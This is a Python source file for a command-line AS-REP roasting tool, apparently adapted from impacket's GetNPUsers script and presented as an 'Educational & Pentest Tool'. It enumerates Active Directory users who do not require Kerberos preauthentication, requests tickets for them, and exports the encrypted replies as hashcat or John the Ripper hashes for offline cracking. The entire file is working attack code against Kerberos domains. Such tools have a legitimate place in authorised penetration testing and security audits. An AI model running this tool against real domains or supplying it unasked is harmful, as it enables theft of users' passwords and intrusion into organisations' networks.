#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from __future__ import division
from __future__ import print_function

import sys
import argparse
import logging
import random
import datetime
from binascii import hexlify

from pyasn1.codec.der import decoder, encoder
from pyasn1.type.univ import noValue

from impacket import version
from impacket.dcerpc.v5.samr import UF_ACCOUNTDISABLE, UF_DONT_REQUIRE_PREAUTH
from impacket.examples import logger
from impacket.examples.utils import parse_identity, ldap_login
from impacket.krb5 import constants
from impacket.krb5.asn1 import AS_REQ, KERB_PA_PAC_REQUEST, KRB_ERROR, AS_REP, seq_set, seq_set_iter
from impacket.krb5.kerberosv5 import sendReceive, KerberosError
from impacket.krb5.types import KerberosTime, Principal
from impacket.ldap import ldap, ldapasn1

# ANSI Цвета для оформления терминала
COLOR_CYAN = "\033[96m"
COLOR_GREEN = "\033[92m"
COLOR_YELLOW = "\033[93m"
COLOR_RED = "\033[91m"
COLOR_MAGENTA = "\033[95m"
COLOR_RESET = "\033[0m"
COLOR_BOLD = "\033[1m"

def print_banner():
    banner = rf"""
{COLOR_YELLOW}    _    ____  ____  __  __
   / \  / ___||  _ \ \ \/ /
  / _ \ \___ \| |_) | \  / 
 / ___ \ ___) |  _ <  /  \ 
/_/   \_\____/|_| \_\/_/\_\ 
{COLOR_RESET}{COLOR_CYAN}{COLOR_BOLD}           [ AS-REP ROASTING Tool | by Davud Qasimov ]{COLOR_RESET}
{COLOR_GREEN}[*] Educational & Pentest Tool v1.0{COLOR_RESET}
"""
    print(banner)


class GetUserNoPreAuth:
    @staticmethod
    def printTable(items, header):
        colLen = []
        for i, col in enumerate(header):
            rowMaxLen = max([len(str(row[i])) for row in items])
            colLen.append(max(rowMaxLen, len(col)))

        outputFormat = ' '.join(['{%d:%ds}' % (num, width) for num, width in enumerate(colLen)])

        # Печать заголовка таблицы
        print(f"{COLOR_BOLD}" + outputFormat.format(*header) + f"{COLOR_RESET}")
        print(' '.join(['-' * itemLen for itemLen in colLen]))

        # Печать строк
        for row in items:
            print(outputFormat.format(*row))

    def __init__(self, username, password, domain, cmdLineOptions):
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__target = None
        self.__lmhash = ''
        self.__nthash = ''
        self.__no_pass = cmdLineOptions.no_pass
        self.__outputFileName = cmdLineOptions.outputfile
        self.__outputFormat = cmdLineOptions.format
        self.__usersFile = cmdLineOptions.usersfile
        self.__aesKey = cmdLineOptions.aesKey
        self.__doKerberos = cmdLineOptions.k
        self.__requestTGT = cmdLineOptions.request
        self.__kdcIP = cmdLineOptions.dc_ip
        self.__kdcHost = cmdLineOptions.dc_host
        if cmdLineOptions.hashes is not None:
            self.__lmhash, self.__nthash = cmdLineOptions.hashes.split(':')

        domainParts = self.__domain.split('.')
        self.baseDN = ''
        for i in domainParts:
            self.baseDN += 'dc=%s,' % i
        self.baseDN = self.baseDN[:-1]

    @staticmethod
    def getUnixTime(t):
        t -= 116444736000000000
        t /= 10000000
        return t

    def getTGT(self, userName, requestPAC=True):
        clientName = Principal(userName, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
        asReq = AS_REQ()

        domain = self.__domain.upper()
        serverName = Principal('krbtgt/%s' % domain, type=constants.PrincipalNameType.NT_PRINCIPAL.value)

        pacRequest = KERB_PA_PAC_REQUEST()
        pacRequest['include-pac'] = requestPAC
        encodedPacRequest = encoder.encode(pacRequest)

        asReq['pvno'] = 5
        asReq['msg-type'] = int(constants.ApplicationTagNumbers.AS_REQ.value)

        asReq['padata'] = noValue
        asReq['padata'][0] = noValue
        asReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_PAC_REQUEST.value)
        asReq['padata'][0]['padata-value'] = encodedPacRequest

        reqBody = seq_set(asReq, 'req-body')

        opts = list()
        opts.append(constants.KDCOptions.forwardable.value)
        opts.append(constants.KDCOptions.renewable.value)
        opts.append(constants.KDCOptions.proxiable.value)
        reqBody['kdc-options'] = constants.encodeFlags(opts)

        seq_set(reqBody, 'sname', serverName.components_to_asn1)
        seq_set(reqBody, 'cname', clientName.components_to_asn1)

        if domain == '':
            raise Exception('Empty Domain not allowed in Kerberos')

        reqBody['realm'] = domain

        now = datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(days=1)
        reqBody['till'] = KerberosTime.to_asn1(now)
        reqBody['rtime'] = KerberosTime.to_asn1(now)
        reqBody['nonce'] = random.getrandbits(31)

        supportedCiphers = (int(constants.EncryptionTypes.rc4_hmac.value),)
        seq_set_iter(reqBody, 'etype', supportedCiphers)

        message = encoder.encode(asReq)

        try:
            r = sendReceive(message, domain, self.__kdcIP)
        except KerberosError as e:
            if e.getErrorCode() == constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value:
                supportedCiphers = (int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value),
                                    int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value),)
                seq_set_iter(reqBody, 'etype', supportedCiphers)
                message = encoder.encode(asReq)
                r = sendReceive(message, domain, self.__kdcIP)
            else:
                raise e

        try:
            asRep = decoder.decode(r, asn1Spec=KRB_ERROR())[0]
        except:
            asRep = decoder.decode(r, asn1Spec=AS_REP())[0]
        else:
            raise Exception('User %s doesn\'t have UF_DONT_REQUIRE_PREAUTH set' % userName)

        if self.__outputFormat == 'john':
            if asRep['enc-part']['etype'] == 17 or asRep['enc-part']['etype'] == 18:
                return '$krb5asrep$%d$%s%s$%s$%s' % (asRep['enc-part']['etype'], domain, clientName,
                                                     hexlify(asRep['enc-part']['cipher'].asOctets()[:-12]).decode(),
                                                     hexlify(asRep['enc-part']['cipher'].asOctets()[-12:]).decode())
            else:
                return '$krb5asrep$%s@%s:%s$%s' % (clientName, domain,
                                                   hexlify(asRep['enc-part']['cipher'].asOctets()[:16]).decode(),
                                                   hexlify(asRep['enc-part']['cipher'].asOctets()[16:]).decode())
        else:
            if asRep['enc-part']['etype'] == 17 or asRep['enc-part']['etype'] == 18:
                return '$krb5asrep$%d$%s$%s$%s$%s' % (asRep['enc-part']['etype'], clientName, domain,
                                                     hexlify(asRep['enc-part']['cipher'].asOctets()[-12:]).decode(),
                                                     hexlify(asRep['enc-part']['cipher'].asOctets()[:-12]).decode())
            else:
                return '$krb5asrep$%d$%s@%s:%s$%s' % (asRep['enc-part']['etype'], clientName, domain,
                                                     hexlify(asRep['enc-part']['cipher'].asOctets()[:16]).decode(),
                                                     hexlify(asRep['enc-part']['cipher'].asOctets()[16:]).decode())

    @staticmethod
    def outputTGT(entry, fd=None):
        print(f"{COLOR_GREEN}{entry}{COLOR_RESET}")
        if fd is not None:
            fd.write(entry + '\n')

    def run(self):
        if self.__usersFile:
            self.request_users_file_TGTs()
            return

        if self.__doKerberos is False and self.__no_pass is True:
            logging.info(f"{COLOR_CYAN}Getting TGT for {self.__username}{COLOR_RESET}")
            self.request_multiple_TGTs([self.__username])
            return

        try:
            ldapConnection = ldap_login(self.__target, self.baseDN, self.__kdcIP, self.__kdcHost, self.__doKerberos, self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash, self.__aesKey)
            self.__target = ldapConnection._dstHost
        except ldap.LDAPSessionError as e:
            if str(e).find('strongerAuthRequired') < 0:
                logging.info(f"{COLOR_YELLOW}Cannot authenticate {self.__username}, trying to get TGT directly{COLOR_RESET}")
                self.request_multiple_TGTs([self.__username])   
                return
            raise e

        searchFilter = "(&(UserAccountControl:1.2.840.113556.1.4.803:=%d)" \
                       "(!(UserAccountControl:1.2.840.113556.1.4.803:=%d))(!(objectCategory=computer)))" % \
                       (UF_DONT_REQUIRE_PREAUTH, UF_ACCOUNTDISABLE)

        try:
            logging.debug('Search Filter=%s' % searchFilter)
            resp = ldapConnection.search(searchFilter=searchFilter,
                                         attributes=['sAMAccountName',
                                                     'pwdLastSet', 'MemberOf', 'userAccountControl', 'lastLogon'],
                                         sizeLimit=999)
        except ldap.LDAPSearchError as e:
            if e.getErrorString().find('sizeLimitExceeded') >= 0:
                logging.debug('sizeLimitExceeded caught, processing existing data')
                resp = e.getAnswers()
            else:
                if str(e).find('NTLMAuthNegotiate') >= 0:
                    logging.critical(f"{COLOR_RED}NTLM negotiation failed. NTLM might be disabled. Try Kerberos (-k).{COLOR_RESET}")
                else:
                    if self.__kdcIP is not None and self.__kdcHost is not None:
                        logging.critical(f"{COLOR_RED}Check DC IP and Hostname. They must match accurately.{COLOR_RESET}")
                raise

        answers = []
        logging.debug('Total records returned: %d' % len(resp))

        for item in resp:
            if isinstance(item, ldapasn1.SearchResultEntry) is not True:
                continue
            mustCommit = False
            sAMAccountName = ''
            memberOf = ''
            pwdLastSet = ''
            userAccountControl = 0
            lastLogon = 'N/A'
            try:
                for attribute in item['attributes']:
                    if str(attribute['type']) == 'sAMAccountName':
                        sAMAccountName = str(attribute['vals'][0])
                        mustCommit = True
                    elif str(attribute['type']) == 'userAccountControl':
                        userAccountControl = "0x%x" % int(attribute['vals'][0])
                    elif str(attribute['type']) == 'memberOf':
                        memberOf = str(attribute['vals'][0])
                    elif str(attribute['type']) == 'pwdLastSet':
                        if str(attribute['vals'][0]) == '0':
                            pwdLastSet = '<never>'
                        else:
                            pwdLastSet = str(datetime.datetime.fromtimestamp(self.getUnixTime(int(str(attribute['vals'][0])))))
                    elif str(attribute['type']) == 'lastLogon':
                        if str(attribute['vals'][0]) == '0':
                            lastLogon = '<never>'
                        else:
                            lastLogon = str(datetime.datetime.fromtimestamp(self.getUnixTime(int(str(attribute['vals'][0])))))
                if mustCommit is True:
                    answers.append([sAMAccountName, memberOf, pwdLastSet, lastLogon, userAccountControl])
            except Exception as e:
                logging.debug("Exception:", exc_info=True)
                logging.error(f"{COLOR_RED}Skipping item due to error: {str(e)}{COLOR_RESET}")

        if len(answers) > 0:
            print(f"\n{COLOR_CYAN}[+] Found users with UF_DONT_REQUIRE_PREAUTH set:{COLOR_RESET}\n")
            self.printTable(answers, header=["Name", "MemberOf", "PasswordLastSet", "LastLogon", "UAC"])
            print('\n')

            if self.__requestTGT is True:
                usernames = [answer[0] for answer in answers]
                self.request_multiple_TGTs(usernames)
        else:
            print(f"{COLOR_YELLOW}[*] No entries found!{COLOR_RESET}")

    def request_users_file_TGTs(self):
        try:
            with open(self.__usersFile, 'r') as fi:
                usernames = [line.strip() for line in fi if line.strip()]
            print(f"{COLOR_CYAN}[+] Loaded {len(usernames)} users from {self.__usersFile}{COLOR_RESET}")
            self.request_multiple_TGTs(usernames)
        except Exception as e:
            logging.error(f"{COLOR_RED}Error reading users file: {e}{COLOR_RESET}")

    def request_multiple_TGTs(self, usernames):
        fd = open(self.__outputFileName, 'w+') if self.__outputFileName is not None else None
        print(f"{COLOR_YELLOW}[*] Requesting TGTs...{COLOR_RESET}")
        for username in usernames:
            try:
                entry = self.getTGT(username)
                self.outputTGT(entry, fd)
            except Exception as e:
                logging.error(f"{COLOR_RED}[!] {username}: {str(e)}{COLOR_RESET}")
        if fd is not None:
            fd.close()
            print(f"\n{COLOR_GREEN}[+] Hashes saved to {self.__outputFileName}{COLOR_RESET}")


if __name__ == '__main__':
    print_banner()

    parser = argparse.ArgumentParser(
        add_help=True, 
        description="Queries target domain for users with 'Do not require Kerberos preauthentication' set and exports their TGTs for cracking."
    )

    parser.add_argument('target', action='store', help='[[domain/]username[:password]]')
    parser.add_argument('-request', action='store_true', default=False, help='Requests TGT for users and outputs them in JtR/hashcat format')
    parser.add_argument('-outputfile', action='store', help='Output filename to write ciphers in JtR/hashcat format')
    parser.add_argument('-format', choices=['hashcat', 'john'], default='hashcat', help='Format to save the AS_REQ (default is hashcat)')
    parser.add_argument('-usersfile', help='File with user per line to test')
    parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')

    group = parser.add_argument_group('authentication')
    group.add_argument('-hashes', action="store", metavar="LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-no-pass', action="store_true", help='Don\'t ask for password (useful for anonymous/AS-REP)')
    group.add_argument('-k', action="store_true", help='Use Kerberos authentication')
    group.add_argument('-aesKey', action="store", metavar="hex key", help='AES key to use for Kerberos Authentication')

    group = parser.add_argument_group('connection')
    group.add_argument('-dc-ip', action='store', metavar='ip address', help='IP Address of the domain controller')
    group.add_argument('-dc-host', action='store', metavar='hostname', help='Hostname of the domain controller to use')

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    logger.init(options.ts, options.debug)
    if options.debug:
        logging.getLogger().setLevel(logging.DEBUG)

    domain, username, password, _, _, options.k = parse_identity(
        options.target, options.hashes, options.no_pass, options.aesKey, options.k
    )

    if domain == '':
        logging.critical(f"{COLOR_RED}Domain should be specified!{COLOR_RESET}")
        sys.exit(1)

    if options.k is False and options.no_pass is True and username == '' and options.usersfile is None:
        logging.critical(f"{COLOR_RED}If -no-pass is specified without -k, specify a username or -usersfile!{COLOR_RESET}")
        sys.exit(1)

    if options.outputfile is not None:
        options.request = True

    try:
        executer = GetUserNoPreAuth(username, password, domain, options)
        executer.run()
    except Exception as e:
        logging.debug("Exception:", exc_info=True)
        logging.error(f"{COLOR_RED}{str(e)}{COLOR_RESET}")
